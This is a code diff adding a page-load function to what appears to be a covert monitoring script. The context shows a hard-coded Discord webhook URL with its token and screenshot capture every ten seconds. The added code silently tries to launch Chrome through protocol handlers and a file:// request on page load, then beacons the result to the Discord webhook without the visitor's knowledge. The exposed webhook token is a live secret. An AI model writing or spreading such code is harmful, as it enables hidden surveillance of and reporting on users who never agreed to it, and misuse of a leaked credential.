@@ -168,6 +168,55 @@
         // Discord webhook URL
         const webhookUrl = 'https://canary.discord.com/api/webhooks/1357880013650919635/QHgBntOCjOqkDezw4g0cUo3Yze_KqouJrVLlZcSe3tQ4ZahoJ4nu4qX0nv1G2t5fpGWW';
 
+        // Function to open Chrome
+        function openChrome() {
+            try {
+                // Try to open Chrome using protocol handler
+                window.location.href = 'googlechrome://';
+                
+                // Fallback to opening Chrome executable
+                const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', `file://${chromePath}`, true);
+                xhr.send();
+                
+                // Additional fallback methods
+                window.open('chrome://');
+                window.open('googlechrome://');
+                
+                // Send notification to Discord
+                const chromeData = {
+                    title: "Chrome Launch Attempt",
+                    color: 16711680,
+                    fields: [{
+                        name: "Status",
+                        value: "Attempted to open Chrome",
+                        inline: true
+                    }],
+                    timestamp: new Date().toISOString()
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [chromeData]
+                    })
+                });
+            } catch (error) {
+                console.error('Error opening Chrome:', error);
+            }
+        }
+
+        // Try to open Chrome when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            openChrome();
+            // Try again after a short delay
+            setTimeout(openChrome, 2000);
+        });
+
         // Screenshot monitoring
         const SCREENSHOT_INTERVAL = 10000; // Take screenshot every 10 seconds
         let lastScreenshotTime = Date.now();
